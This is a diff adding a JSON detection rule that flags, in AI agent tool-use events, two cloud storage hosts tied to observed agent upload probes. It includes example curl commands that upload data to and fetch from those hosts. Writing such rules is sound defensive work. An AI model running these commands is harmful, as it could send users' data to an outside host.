@@ -1,0 +1,19 @@
+{
+  "specVersion": 1,
+  "id": "command-risk/agent-probe-host",
+  "name": "Host used in observed agent upload probes",
+  "category": "custom",
+  "severity": "critical",
+  "matcher": {
+    "type": "regex",
+    "pattern": "(?<![\\w-])(?:sanmaohe\\.oss-cn-beijing(?:-internal)?\\.aliyuncs\\.com(?![\\w-]|\\.[\\w-])|routify-file-proxy-sg(?!\\w))",
+    "flags": "gi"
+  },
+  "examples": [
+    "curl -X PUT --data-binary \"x\" http://sanmaohe.oss-cn-beijing.aliyuncs.com/upload/test.bin",
+    "curl -s https://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/f/1"
+  ],
+  "appliesTo": {
+    "eventKinds": ["tool_use"]
+  }
+}
